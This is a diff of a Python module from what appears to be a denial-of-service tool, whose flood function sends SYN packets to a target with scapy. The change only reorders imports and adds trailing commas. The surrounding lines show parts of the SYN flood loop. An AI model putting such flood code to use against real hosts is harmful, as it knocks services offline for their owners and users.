@@ -1,8 +1,10 @@
 # Import modules
 import random
-from scapy.all import IP, TCP, send
-import tools.randomData as randomData
+
 from colorama import Fore
+from scapy.all import IP, TCP, send
+
+from tools import randomData
 
 
 def flood(target):
@@ -22,9 +24,9 @@ def flood(target):
             send(IP_Packet / TCP_Packet, verbose=False)
         except Exception as e:
             print(
-                f"{Fore.MAGENTA}Error while sending SYN packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
+                f"{Fore.MAGENTA}Error while sending SYN packet\n{Fore.MAGENTA}{e}{Fore.RESET}",
             )
         else:
             print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}SYN packet sent to {'{}:{}'.format(*target)}.{Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.YELLOW}SYN packet sent to {'{}:{}'.format(*target)}.{Fore.RESET}",
             )
